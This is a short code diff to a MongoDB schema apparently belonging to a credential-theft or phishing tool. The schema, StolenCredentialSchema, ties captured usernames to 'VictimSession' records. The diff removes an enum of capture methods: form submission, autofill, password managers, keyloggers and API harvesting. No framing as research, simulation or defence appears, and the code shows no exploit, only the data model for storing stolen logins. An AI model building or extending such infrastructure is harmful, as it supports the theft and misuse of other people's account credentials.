@@ -4,8 +4,7 @@ const StolenCredentialSchema = new mongoose.Schema({
   sessionId: { type: mongoose.Schema.Types.ObjectId, ref: 'VictimSession', required: true, index: true },
   sessionIdStr: { type: String },
   source: { 
-    type: String, 
-    enum: ['form-submit', 'autofill', 'password-manager', 'keylogger', 'manual-input', 'api-harvest', 'unknown'],
+    type: String,
     default: 'unknown'
   },
   username: { type: String },
